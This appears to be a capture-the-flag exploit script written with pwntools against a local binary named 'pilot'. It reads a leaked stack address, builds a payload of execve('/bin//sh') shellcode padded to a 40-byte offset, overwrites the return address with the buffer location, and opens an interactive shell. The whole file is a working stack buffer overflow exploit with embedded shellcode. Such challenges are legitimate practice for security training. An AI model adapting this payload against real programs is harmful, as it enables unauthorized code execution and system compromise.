#!/usr/bin/env python

from pwn import *

'''
Challenge type --> Insert shellcode and execute off the stack
'''

#NOTES----------
#64 bit binary
#offset is 40
#NX stack is off

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

conn = process("./pilot")
buffer_addr = conn.recvline_contains('[*]Location:')
buffer_addr = buffer_addr[12:]

#print(buffer_addr)
#print(type(shellcode))

payload = ''
payload += shellcode
payload += "A"*(40-len(shellcode))
payload += p64(int(buffer_addr, 16))

conn.send(payload)

conn.interactive()
